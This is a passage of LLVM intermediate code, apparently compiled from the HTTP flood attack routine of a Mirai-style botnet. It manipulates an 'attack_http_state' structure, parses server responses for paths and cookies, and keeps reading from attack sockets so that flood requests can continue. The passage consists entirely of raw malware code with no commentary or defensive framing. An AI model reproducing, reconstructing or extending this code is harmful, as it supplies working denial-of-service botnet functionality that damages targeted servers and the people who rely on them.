1845:                                             ; preds = %1842, %1836
  %1846 = load i8*, i8** %57, align 8
  %1847 = load i8*, i8** %57, align 8
  %1848 = load i32, i32* %10, align 4
  %1849 = sext i32 %1848 to i64
  %1850 = getelementptr inbounds i8, i8* %1847, i64 %1849
  %1851 = load i32, i32* %56, align 4
  %1852 = load i32, i32* %10, align 4
  %1853 = sub nsw i32 %1851, %1852
  %1854 = sext i32 %1853 to i64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* align 1 %1846, i8* align 1 %1850, i64 %1854, i1 false)
  store i32 0, i32* %10, align 4
  br label %1855

1855:                                             ; preds = %1876, %1845
  %1856 = load i8*, i8** %57, align 8
  %1857 = load i32, i32* %10, align 4
  %1858 = sext i32 %1857 to i64
  %1859 = getelementptr inbounds i8, i8* %1856, i64 %1858
  %1860 = load i8, i8* %1859, align 1
  %1861 = sext i8 %1860 to i32
  %1862 = icmp ne i32 %1861, 0
  br i1 %1862, label %1863, label %1879

1863:                                             ; preds = %1855
  %1864 = load i8*, i8** %57, align 8
  %1865 = load i32, i32* %10, align 4
  %1866 = sext i32 %1865 to i64
  %1867 = getelementptr inbounds i8, i8* %1864, i64 %1866
  %1868 = load i8, i8* %1867, align 1
  %1869 = sext i8 %1868 to i32
  %1870 = icmp eq i32 %1869, 47
  br i1 %1870, label %1871, label %1876

1871:                                             ; preds = %1863
  %1872 = load i8*, i8** %57, align 8
  %1873 = load i32, i32* %10, align 4
  %1874 = sext i32 %1873 to i64
  %1875 = getelementptr inbounds i8, i8* %1872, i64 %1874
  store i8 0, i8* %1875, align 1
  br label %1879

1876:                                             ; preds = %1863
  %1877 = load i32, i32* %10, align 4
  %1878 = add nsw i32 %1877, 1
  store i32 %1878, i32* %10, align 4
  br label %1855, !llvm.loop !19

1879:                                             ; preds = %1871, %1855
  %1880 = load i8*, i8** %57, align 8
  %1881 = call i32 @util_strlen(i8* noundef %1880)
  %1882 = icmp sgt i32 %1881, 0
  br i1 %1882, label %1883, label %1893

1883:                                             ; preds = %1879
  %1884 = load i8*, i8** %57, align 8
  %1885 = call i32 @util_strlen(i8* noundef %1884)
  %1886 = icmp slt i32 %1885, 128
  br i1 %1886, label %1887, label %1893

1887:                                             ; preds = %1883
  %1888 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1889 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1888, i32 0, i32 7
  %1890 = getelementptr inbounds [129 x i8], [129 x i8]* %1889, i64 0, i64 0
  %1891 = load i8*, i8** %57, align 8
  %1892 = call i32 @util_strcpy(i8* noundef %1890, i8* noundef %1891)
  br label %1893

1893:                                             ; preds = %1887, %1883, %1879
  %1894 = load i8*, i8** %57, align 8
  %1895 = load i32, i32* %10, align 4
  %1896 = add nsw i32 %1895, 1
  %1897 = sext i32 %1896 to i64
  %1898 = getelementptr inbounds i8, i8* %1894, i64 %1897
  %1899 = call i32 @util_strlen(i8* noundef %1898)
  %1900 = icmp slt i32 %1899, 256
  br i1 %1900, label %1901, label %1925

1901:                                             ; preds = %1893
  %1902 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1903 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1902, i32 0, i32 6
  %1904 = getelementptr inbounds [257 x i8], [257 x i8]* %1903, i64 0, i64 0
  %1905 = getelementptr inbounds i8, i8* %1904, i64 1
  call void @util_zero(i8* noundef %1905, i32 noundef 255)
  %1906 = load i8*, i8** %57, align 8
  %1907 = load i32, i32* %10, align 4
  %1908 = add nsw i32 %1907, 1
  %1909 = sext i32 %1908 to i64
  %1910 = getelementptr inbounds i8, i8* %1906, i64 %1909
  %1911 = call i32 @util_strlen(i8* noundef %1910)
  %1912 = icmp sgt i32 %1911, 0
  br i1 %1912, label %1913, label %1924

1913:                                             ; preds = %1901
  %1914 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1915 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1914, i32 0, i32 6
  %1916 = getelementptr inbounds [257 x i8], [257 x i8]* %1915, i64 0, i64 0
  %1917 = getelementptr inbounds i8, i8* %1916, i64 1
  %1918 = load i8*, i8** %57, align 8
  %1919 = load i32, i32* %10, align 4
  %1920 = add nsw i32 %1919, 1
  %1921 = sext i32 %1920 to i64
  %1922 = getelementptr inbounds i8, i8* %1918, i64 %1921
  %1923 = call i32 @util_strcpy(i8* noundef %1917, i8* noundef %1922)
  br label %1924

1924:                                             ; preds = %1913, %1901
  br label %1925

1925:                                             ; preds = %1924, %1893
  br label %1966

1926:                                             ; preds = %1826
  %1927 = load i8*, i8** %57, align 8
  %1928 = getelementptr inbounds i8, i8* %1927, i64 0
  %1929 = load i8, i8* %1928, align 1
  %1930 = sext i8 %1929 to i32
  %1931 = icmp eq i32 %1930, 47
  br i1 %1931, label %1932, label %1965

1932:                                             ; preds = %1926
  %1933 = load i8*, i8** %57, align 8
  %1934 = load i32, i32* %10, align 4
  %1935 = add nsw i32 %1934, 1
  %1936 = sext i32 %1935 to i64
  %1937 = getelementptr inbounds i8, i8* %1933, i64 %1936
  %1938 = call i32 @util_strlen(i8* noundef %1937)
  %1939 = icmp slt i32 %1938, 256
  br i1 %1939, label %1940, label %1964

1940:                                             ; preds = %1932
  %1941 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1942 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1941, i32 0, i32 6
  %1943 = getelementptr inbounds [257 x i8], [257 x i8]* %1942, i64 0, i64 0
  %1944 = getelementptr inbounds i8, i8* %1943, i64 1
  call void @util_zero(i8* noundef %1944, i32 noundef 255)
  %1945 = load i8*, i8** %57, align 8
  %1946 = load i32, i32* %10, align 4
  %1947 = add nsw i32 %1946, 1
  %1948 = sext i32 %1947 to i64
  %1949 = getelementptr inbounds i8, i8* %1945, i64 %1948
  %1950 = call i32 @util_strlen(i8* noundef %1949)
  %1951 = icmp sgt i32 %1950, 0
  br i1 %1951, label %1952, label %1963

1952:                                             ; preds = %1940
  %1953 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1954 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1953, i32 0, i32 6
  %1955 = getelementptr inbounds [257 x i8], [257 x i8]* %1954, i64 0, i64 0
  %1956 = getelementptr inbounds i8, i8* %1955, i64 1
  %1957 = load i8*, i8** %57, align 8
  %1958 = load i32, i32* %10, align 4
  %1959 = add nsw i32 %1958, 1
  %1960 = sext i32 %1959 to i64
  %1961 = getelementptr inbounds i8, i8* %1957, i64 %1960
  %1962 = call i32 @util_strcpy(i8* noundef %1956, i8* noundef %1961)
  br label %1963

1963:                                             ; preds = %1952, %1940
  br label %1964

1964:                                             ; preds = %1963, %1932
  br label %1965

1965:                                             ; preds = %1964, %1926
  br label %1966

1966:                                             ; preds = %1965, %1925
  %1967 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1968 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1967, i32 0, i32 9
  %1969 = getelementptr inbounds [9 x i8], [9 x i8]* %1968, i64 0, i64 0
  %1970 = call i8* @strcpy(i8* noundef %1969, i8* noundef getelementptr inbounds ([4 x i8], [4 x i8]* @.str, i64 0, i64 0)) #6
  %1971 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1972 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1971, i32 0, i32 1
  store i8 10, i8* %1972, align 4
  br label %2453

1973:                                             ; preds = %1716
  br label %1974

1974:                                             ; preds = %1973, %1659
  br label %1975

1975:                                             ; preds = %1974, %1639
  %1976 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 0
  %1977 = load i32, i32* %12, align 4
  %1978 = call i32 @util_memsearch(i8* noundef %1976, i32 noundef %1977, i8* noundef getelementptr inbounds ([5 x i8], [5 x i8]* @.str.8, i64 0, i64 0), i32 noundef 4)
  store i32 %1978, i32* %37, align 4
  %1979 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1980 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1979, i32 0, i32 9
  %1981 = getelementptr inbounds [9 x i8], [9 x i8]* %1980, i64 0, i64 0
  %1982 = call signext i8 @util_strcmp(i8* noundef %1981, i8* noundef getelementptr inbounds ([5 x i8], [5 x i8]* @.str.12, i64 0, i64 0))
  %1983 = sext i8 %1982 to i32
  %1984 = icmp ne i32 %1983, 0
  br i1 %1984, label %1992, label %1985

1985:                                             ; preds = %1975
  %1986 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1987 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1986, i32 0, i32 9
  %1988 = getelementptr inbounds [9 x i8], [9 x i8]* %1987, i64 0, i64 0
  %1989 = call signext i8 @util_strcmp(i8* noundef %1988, i8* noundef getelementptr inbounds ([4 x i8], [4 x i8]* @.str, i64 0, i64 0))
  %1990 = sext i8 %1989 to i32
  %1991 = icmp ne i32 %1990, 0
  br i1 %1991, label %1992, label %1995

1992:                                             ; preds = %1985, %1975
  %1993 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1994 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1993, i32 0, i32 1
  store i8 7, i8* %1994, align 4
  br label %2006

1995:                                             ; preds = %1985
  %1996 = load i32, i32* %12, align 4
  %1997 = load i32, i32* %37, align 4
  %1998 = icmp sgt i32 %1996, %1997
  br i1 %1998, label %1999, label %2002

1999:                                             ; preds = %1995
  %2000 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2001 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2000, i32 0, i32 1
  store i8 10, i8* %2001, align 4
  br label %2005

2002:                                             ; preds = %1995
  %2003 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2004 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2003, i32 0, i32 1
  store i8 1, i8* %2004, align 4
  br label %2005

2005:                                             ; preds = %2002, %1999
  br label %2006

2006:                                             ; preds = %2005, %1992
  %2007 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2008 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2007, i32 0, i32 0
  %2009 = load i32, i32* %2008, align 4
  %2010 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 0
  %2011 = load i32, i32* %37, align 4
  %2012 = sext i32 %2011 to i64
  %2013 = call i64 @recv(i32 noundef %2009, i8* noundef %2010, i64 noundef %2012, i32 noundef 16384)
  %2014 = trunc i64 %2013 to i32
  store i32 %2014, i32* %12, align 4
  br label %2451

2015:                                             ; preds = %1046
  %2016 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2017 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2016, i32 0, i32 1
  %2018 = load i8, i8* %2017, align 4
  %2019 = zext i8 %2018 to i32
  %2020 = icmp eq i32 %2019, 7
  br i1 %2020, label %2021, label %2398

2021:                                             ; preds = %2015
  br label %2022

2022:                                             ; preds = %2396, %2021
  %2023 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2024 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2023, i32 0, i32 1
  %2025 = load i8, i8* %2024, align 4
  %2026 = zext i8 %2025 to i32
  %2027 = icmp ne i32 %2026, 7
  br i1 %2027, label %2028, label %2029

2028:                                             ; preds = %2022
  br label %2397

2029:                                             ; preds = %2022
  %2030 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2031 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2030, i32 0, i32 17
  %2032 = load i32, i32* %2031, align 4
  %2033 = icmp eq i32 %2032, 1024
  br i1 %2033, label %2034, label %2046

2034:                                             ; preds = %2029
  %2035 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2036 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2035, i32 0, i32 18
  %2037 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2036, i64 0, i64 0
  %2038 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2039 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2038, i32 0, i32 18
  %2040 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2039, i64 0, i64 0
  %2041 = getelementptr inbounds i8, i8* %2040, i64 64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* align 4 %2037, i8* align 1 %2041, i64 960, i1 false)
  %2042 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2043 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2042, i32 0, i32 17
  %2044 = load i32, i32* %2043, align 4
  %2045 = sub nsw i32 %2044, 64
  store i32 %2045, i32* %2043, align 4
  br label %2046

2046:                                             ; preds = %2034, %2029
  %2047 = call i32* @__errno_location() #7
  store i32 0, i32* %2047, align 4
  %2048 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2049 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2048, i32 0, i32 0
  %2050 = load i32, i32* %2049, align 4
  %2051 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2052 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2051, i32 0, i32 18
  %2053 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2052, i64 0, i64 0
  %2054 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2055 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2054, i32 0, i32 17
  %2056 = load i32, i32* %2055, align 4
  %2057 = sext i32 %2056 to i64
  %2058 = getelementptr inbounds i8, i8* %2053, i64 %2057
  %2059 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2060 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2059, i32 0, i32 17
  %2061 = load i32, i32* %2060, align 4
  %2062 = sub nsw i32 1024, %2061
  %2063 = sext i32 %2062 to i64
  %2064 = call i64 @recv(i32 noundef %2050, i8* noundef %2058, i64 noundef %2063, i32 noundef 16384)
  %2065 = trunc i64 %2064 to i32
  store i32 %2065, i32* %12, align 4
  %2066 = load i32, i32* %12, align 4
  %2067 = icmp eq i32 %2066, 0
  br i1 %2067, label %2068, label %2070

2068:                                             ; preds = %2046
  %2069 = call i32* @__errno_location() #7
  store i32 104, i32* %2069, align 4
  store i32 -1, i32* %12, align 4
  br label %2070

2070:                                             ; preds = %2068, %2046
  %2071 = load i32, i32* %12, align 4
  %2072 = icmp eq i32 %2071, -1
  br i1 %2072, label %2073, label %2091

2073:                                             ; preds = %2070
  %2074 = call i32* @__errno_location() #7
  %2075 = load i32, i32* %2074, align 4
  %2076 = icmp ne i32 %2075, 11
  br i1 %2076, label %2077, label %2090

2077:                                             ; preds = %2073
  %2078 = call i32* @__errno_location() #7
  %2079 = load i32, i32* %2078, align 4
  %2080 = icmp ne i32 %2079, 11
  br i1 %2080, label %2081, label %2090

2081:                                             ; preds = %2077
  %2082 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2083 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2082, i32 0, i32 0
  %2084 = load i32, i32* %2083, align 4
  %2085 = call i32 @close(i32 noundef %2084)
  %2086 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2087 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2086, i32 0, i32 0
  store i32 -1, i32* %2087, align 4
  %2088 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2089 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2088, i32 0, i32 1
  store i8 0, i8* %2089, align 4
  br label %2090

2090:                                             ; preds = %2081, %2077, %2073
  br label %2397

2091:                                             ; preds = %2070
  %2092 = load i32, i32* %12, align 4
  %2093 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2094 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2093, i32 0, i32 17
  %2095 = load i32, i32* %2094, align 4
  %2096 = add nsw i32 %2095, %2092
  store i32 %2096, i32* %2094, align 4
  %2097 = load i32, i32* %27, align 4
  %2098 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2099 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2098, i32 0, i32 2
  store i32 %2097, i32* %2099, align 4
  br label %2100

2100:                                             ; preds = %2395, %2091
  store i32 0, i32* %59, align 4
  %2101 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2102 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2101, i32 0, i32 14
  %2103 = load i32, i32* %2102, align 4
  %2104 = icmp sgt i32 %2103, 0
  br i1 %2104, label %2105, label %2276

2105:                                             ; preds = %2100
  %2106 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2107 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2106, i32 0, i32 14
  %2108 = load i32, i32* %2107, align 4
  %2109 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2110 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2109, i32 0, i32 17
  %2111 = load i32, i32* %2110, align 4
  %2112 = icmp sgt i32 %2108, %2111
  br i1 %2112, label %2113, label %2117

2113:                                             ; preds = %2105
  %2114 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2115 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2114, i32 0, i32 17
  %2116 = load i32, i32* %2115, align 4
  br label %2121

2117:                                             ; preds = %2105
  %2118 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2119 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2118, i32 0, i32 14
  %2120 = load i32, i32* %2119, align 4
  br label %2121

2121:                                             ; preds = %2117, %2113
  %2122 = phi i32 [ %2116, %2113 ], [ %2120, %2117 ]
  store i32 %2122, i32* %59, align 4
  %2123 = load i32, i32* %59, align 4
  %2124 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2125 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2124, i32 0, i32 14
  %2126 = load i32, i32* %2125, align 4
  %2127 = sub nsw i32 %2126, %2123
  store i32 %2127, i32* %2125, align 4
  %2128 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2129 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2128, i32 0, i32 11
  %2130 = load i32, i32* %2129, align 4
  %2131 = icmp eq i32 %2130, 1
  br i1 %2131, label %2132, label %2275

2132:                                             ; preds = %2121
  %2133 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2134 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2133, i32 0, i32 18
  %2135 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2134, i64 0, i64 0
  %2136 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2137 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2136, i32 0, i32 17
  %2138 = load i32, i32* %2137, align 4
  %2139 = call i8* @table_retrieve_val(i32 noundef 43, i32* noundef null)
  %2140 = call i32 @util_memsearch(i8* noundef %2135, i32 noundef %2138, i8* noundef %2139, i32 noundef 11)
  %2141 = icmp ne i32 %2140, -1
  br i1 %2141, label %2142, label %2274

2142:                                             ; preds = %2132
  %2143 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2144 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2143, i32 0, i32 18
  %2145 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2144, i64 0, i64 0
  %2146 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2147 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2146, i32 0, i32 17
  %2148 = load i32, i32* %2147, align 4
  %2149 = call i8* @table_retrieve_val(i32 noundef 43, i32* noundef null)
  %2150 = call i32 @util_memsearch(i8* noundef %2145, i32 noundef %2148, i8* noundef %2149, i32 noundef 11)
  store i32 %2150, i32* %60, align 4
  %2151 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2152 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2151, i32 0, i32 18
  %2153 = load i32, i32* %60, align 4
  %2154 = sext i32 %2153 to i64
  %2155 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2152, i64 0, i64 %2154
  %2156 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2157 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2156, i32 0, i32 17
  %2158 = load i32, i32* %2157, align 4
  %2159 = load i32, i32* %60, align 4
  %2160 = sub nsw i32 %2158, %2159
  %2161 = call i32 @util_memsearch(i8* noundef %2155, i32 noundef %2160, i8* noundef getelementptr inbounds ([2 x i8], [2 x i8]* @.str.13, i64 0, i64 0), i32 noundef 1)
  store i32 %2161, i32* %61, align 4
  %2162 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2163 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2162, i32 0, i32 18
  %2164 = load i32, i32* %60, align 4
  %2165 = load i32, i32* %61, align 4
  %2166 = sub nsw i32 %2165, 1
  %2167 = add nsw i32 %2164, %2166
  %2168 = sext i32 %2167 to i64
  %2169 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2163, i64 0, i64 %2168
  store i8 0, i8* %2169, align 1
  %2170 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2171 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2170, i32 0, i32 15
  %2172 = load i32, i32* %2171, align 4
  %2173 = icmp slt i32 %2172, 5
  br i1 %2173, label %2174, label %2269

2174:                                             ; preds = %2142
  %2175 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2176 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2175, i32 0, i32 18
  %2177 = load i32, i32* %60, align 4
  %2178 = sext i32 %2177 to i64
  %2179 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2176, i64 0, i64 %2178
  %2180 = call i32 @util_strlen(i8* noundef %2179)
  %2181 = icmp slt i32 %2180, 128
  br i1 %2181, label %2182, label %2269

2182:                                             ; preds = %2174
  %2183 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2184 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2183, i32 0, i32 16
  %2185 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2186 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2185, i32 0, i32 15
  %2187 = load i32, i32* %2186, align 4
  %2188 = sext i32 %2187 to i64
  %2189 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %2184, i64 0, i64 %2188
  %2190 = getelementptr inbounds [128 x i8], [128 x i8]* %2189, i64 0, i64 0
  %2191 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2192 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2191, i32 0, i32 18
  %2193 = load i32, i32* %60, align 4
  %2194 = sext i32 %2193 to i64
  %2195 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2192, i64 0, i64 %2194
  %2196 = call i32 @util_strcpy(i8* noundef %2190, i8* noundef %2195)
  %2197 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2198 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2197, i32 0, i32 16
  %2199 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2200 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2199, i32 0, i32 15
  %2201 = load i32, i32* %2200, align 4
  %2202 = sext i32 %2201 to i64
  %2203 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %2198, i64 0, i64 %2202
  %2204 = getelementptr inbounds [128 x i8], [128 x i8]* %2203, i64 0, i64 0
  %2205 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2206 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2205, i32 0, i32 16
  %2207 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2208 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2207, i32 0, i32 15
  %2209 = load i32, i32* %2208, align 4
  %2210 = sext i32 %2209 to i64
  %2211 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %2206, i64 0, i64 %2210
  %2212 = getelementptr inbounds [128 x i8], [128 x i8]* %2211, i64 0, i64 0
  %2213 = call i32 @util_strlen(i8* noundef %2212)
  %2214 = sext i32 %2213 to i64
  %2215 = getelementptr inbounds i8, i8* %2204, i64 %2214
  %2216 = call i32 @util_strcpy(i8* noundef %2215, i8* noundef getelementptr inbounds ([2 x i8], [2 x i8]* @.str.14, i64 0, i64 0))
  %2217 = load i32, i32* %61, align 4
  %2218 = add nsw i32 %2217, 3
  %2219 = load i32, i32* %60, align 4
  %2220 = add nsw i32 %2219, %2218
  store i32 %2220, i32* %60, align 4
  %2221 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2222 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2221, i32 0, i32 18
  %2223 = load i32, i32* %60, align 4
  %2224 = sext i32 %2223 to i64
  %2225 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2222, i64 0, i64 %2224
  %2226 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2227 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2226, i32 0, i32 17
  %2228 = load i32, i32* %2227, align 4
  %2229 = load i32, i32* %60, align 4
  %2230 = sub nsw i32 %2228, %2229
  %2231 = call i32 @util_memsearch(i8* noundef %2225, i32 noundef %2230, i8* noundef getelementptr inbounds ([2 x i8], [2 x i8]* @.str.13, i64 0, i64 0), i32 noundef 1)
  store i32 %2231, i32* %61, align 4
  %2232 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2233 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2232, i32 0, i32 18
  %2234 = load i32, i32* %60, align 4
  %2235 = load i32, i32* %61, align 4
  %2236 = sub nsw i32 %2235, 1
  %2237 = add nsw i32 %2234, %2236
  %2238 = sext i32 %2237 to i64
  %2239 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2233, i64 0, i64 %2238
  store i8 0, i8* %2239, align 1
  %2240 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2241 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2240, i32 0, i32 16
  %2242 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2243 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2242, i32 0, i32 15
  %2244 = load i32, i32* %2243, align 4
  %2245 = sext i32 %2244 to i64
  %2246 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %2241, i64 0, i64 %2245
  %2247 = getelementptr inbounds [128 x i8], [128 x i8]* %2246, i64 0, i64 0
  %2248 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2249 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2248, i32 0, i32 16
  %2250 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2251 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2250, i32 0, i32 15
  %2252 = load i32, i32* %2251, align 4
  %2253 = sext i32 %2252 to i64
  %2254 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %2249, i64 0, i64 %2253
  %2255 = getelementptr inbounds [128 x i8], [128 x i8]* %2254, i64 0, i64 0
  %2256 = call i32 @util_strlen(i8* noundef %2255)
  %2257 = sext i32 %2256 to i64
  %2258 = getelementptr inbounds i8, i8* %2247, i64 %2257
  %2259 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2260 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2259, i32 0, i32 18
  %2261 = load i32, i32* %60, align 4
  %2262 = sext i32 %2261 to i64
  %2263 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2260, i64 0, i64 %2262
  %2264 = call i32 @util_strcpy(i8* noundef %2258, i8* noundef %2263)
  %2265 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2266 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2265, i32 0, i32 15
  %2267 = load i32, i32* %2266, align 4
  %2268 = add nsw i32 %2267, 1
  store i32 %2268, i32* %2266, align 4
  br label %2269

2269:                                             ; preds = %2182, %2174, %2142
  %2270 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2271 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2270, i32 0, i32 14
  store i32 -1, i32* %2271, align 4
  %2272 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2273 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2272, i32 0, i32 1
  store i8 10, i8* %2273, align 4
  br label %2396

2274:                                             ; preds = %2132
  br label %2275

2275:                                             ; preds = %2274, %2121
  br label %2276

2276:                                             ; preds = %2275, %2100
  %2277 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2278 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2277, i32 0, i32 14
  %2279 = load i32, i32* %2278, align 4
  %2280 = icmp eq i32 %2279, 0
  br i1 %2280, label %2281, label %2359

